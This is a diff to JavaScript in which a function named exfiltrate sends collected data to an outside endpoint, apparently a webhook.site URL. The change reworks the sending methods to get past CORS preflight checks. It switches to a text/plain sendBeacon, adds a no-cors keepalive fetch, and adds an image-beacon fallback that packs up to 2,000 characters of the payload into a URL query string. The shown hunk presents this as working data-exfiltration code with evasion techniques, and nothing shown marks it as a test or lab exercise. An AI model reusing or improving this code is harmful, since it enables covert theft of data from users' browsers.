@@ -202,29 +202,32 @@ async function exfiltrate(data) {
   if (!EXFIL_ENDPOINT) return false;
   const payload = JSON.stringify(data);
 
-  // Method 1: fetch with CORS (webhook.site supports it)
+  // Use ONLY CORS-safe methods to avoid preflight OPTIONS requests.
+  // Any Content-Type other than text/plain, application/x-www-form-urlencoded,
+  // or multipart/form-data triggers a preflight that webhook.site blocks.
+
+  // Method 1: sendBeacon with text/plain Blob (no preflight, fire-and-forget)
   try {
-    await fetch(EXFIL_ENDPOINT, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: payload
-    });
-    return true;
+    const blob = new Blob([payload], { type: 'text/plain' });
+    if (navigator.sendBeacon(EXFIL_ENDPOINT, blob)) return true;
   } catch (e1) {}
 
-  // Method 2: sendBeacon with Blob (no CORS preflight for simple types)
-  try {
-    const blob = new Blob([payload], { type: 'application/json' });
-    if (navigator.sendBeacon(EXFIL_ENDPOINT, blob)) return true;
-  } catch (e2) {}
-
-  // Method 3: fetch with text/plain (always a simple request, no preflight)
+  // Method 2: fetch with text/plain (simple request, no preflight)
   try {
     await fetch(EXFIL_ENDPOINT, {
       method: 'POST',
       headers: { 'Content-Type': 'text/plain' },
-      body: payload
+      body: payload,
+      mode: 'no-cors',
+      keepalive: true
     });
+    return true;
+  } catch (e2) {}
+
+  // Method 3: image beacon with URL-encoded payload chunks
+  try {
+    const encoded = encodeURIComponent(payload.slice(0, 2000));
+    new Image().src = EXFIL_ENDPOINT + '?d=' + encoded;
     return true;
   } catch (e3) {}
 
